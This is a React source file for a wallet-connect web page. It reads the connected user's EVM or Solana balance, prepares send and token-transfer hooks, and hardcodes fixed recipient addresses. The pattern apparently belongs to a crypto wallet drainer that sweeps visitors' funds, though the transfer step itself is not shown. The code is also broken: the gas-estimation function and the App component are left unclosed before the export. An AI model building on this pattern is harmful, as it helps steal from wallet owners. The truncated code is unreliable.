import React, { useState, useEffect } from "react";
import { useAppKitAccount, useAppKitProvider, useAppKitBalance } from "@reown/appkit/react";
import { useBalance, useSendTransaction, useWriteContract } from "wagmi";
import { parseEther, parseUnits } from "viem";
import ERC20_ABI from "./abi/erc20.json";
import { ethers } from "ethers";

const backgroundStyle = {
  position: "fixed",
  top: 0,
  left: 0,
  width: "100%",
  height: "100%",
  zIndex: -1,
  background: "linear-gradient(-45deg, #ff9a9e, #fad0c4, #a1c4fd, #c2e9fb)",
  backgroundSize: "400% 400%",
  animation: "gradientBG 15s ease infinite"
};

const styleEl = document.createElement("style");
styleEl.textContent = `
  @keyframes gradientBG {
    0% {background-position: 0% 50%;}
    50% {background-position: 100% 50%;}
    100% {background-position: 0% 50%;}
  }
`;
document.head.appendChild(styleEl);

function App() {
  const { address, isConnected, caipAddress } = useAppKitAccount();
  const [tokenAddress, setTokenAddress] = useState("");

  const isSolana = caipAddress?.startsWith("solana:");
  const isEvm = isConnected && !isSolana;
  const solanaAddress = isSolana ? address : null;

  const FIXED_EVM_RECIPIENT = "0x47E11Fd3e3cEF8Ea9beC9805D1F27dBe775B1D69";
  const FIXED_SOL_RECIPIENT = "5a39EMz6Hm3k1gFcMmTxojPijfiDzNxQcWhDpRUtgDRv";

  const ETH_RPC = import.meta.env.VITE_ETHEREUM_RPC_URL;
  const POLYGON_RPC = import.meta.env.VITE_POLYGON_RPC_URL;

  const { data: evmBalance } = useBalance({ address: isEvm ? address : undefined });
  const { sendTransactionAsync } = useSendTransaction();
  const { writeContractAsync } = useWriteContract();

  const estimateGasCost = async (tx, rpcUrl) => {
    try {
      const provider = new ethers.JsonRpcProvider(rpcUrl);
      const estimatedGas = await provider.estimateGas(tx);
      const gasPrice = await provider.getGasPrice();
      return parseFloat(ethers.formatEther(estimatedGas * gasPrice));
    } catch {
      return 0.001;
}

export default App;
